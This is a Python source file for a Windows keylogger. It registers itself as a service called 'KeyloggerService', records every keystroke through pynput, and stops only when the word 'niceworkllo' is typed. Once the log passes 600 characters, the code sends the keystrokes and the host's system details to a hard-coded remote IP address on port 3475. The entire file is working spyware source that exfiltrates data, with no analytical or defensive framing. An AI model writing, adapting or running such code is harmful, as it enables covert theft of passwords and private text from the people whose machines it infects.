from pynput import keyboard
import threading
import requests
import platform
from collections import deque
import sys
import os
import win32serviceutil
import win32service
import win32event
import servicemanager

class Keylogger:
    def __init__(self):
        self.log = ""
        self.stop_word = "niceworkllo"  # Updated stop word
        self.queue = deque(maxlen=len(self.stop_word))
        self.stop_keylogger = False
    
    def send_request(self):
        try:
            response = requests.post(
                "http://34.136.67.113:3475",
                json={"log": self.log, "system_info": system_info},
                timeout=5
            )
        except requests.exceptions.RequestException:
            pass

    def on_press(self, key):
        try:
            char = key.char
            self.log += char
            self.queue.append(char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.tab: "[TAB]"
            }
            special_key = special_keys.get(key, f" [{key}] ")
            self.log += special_key
            self.queue.append(special_key)

        if len(self.queue) == len(self.stop_word):
            typed_word = "".join(self.queue)
            if typed_word == self.stop_word:
                self.stop_keylogger = True
                return False

    def on_release(self, key):
        pass

    def report(self):
        print(self.log)
        if len(self.log) > 600:
            self.send_request()
            self.log = ""
        if not self.stop_keylogger:
            threading.Timer(5, self.report).start()

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.report()
            listener.join()

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyloggerService"
    _svc_display_name_ = "Keylogger Service"
    _svc_description_ = "A simple keylogger service that logs keystrokes and stops on 'niceworkllo'"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.keylogger = Keylogger()

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.keylogger.stop_keylogger = True

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.keylogger.start()

if __name__ == "__main__":
    system_info = platform.uname()._asdict()
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(KeyloggerService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(KeyloggerService)
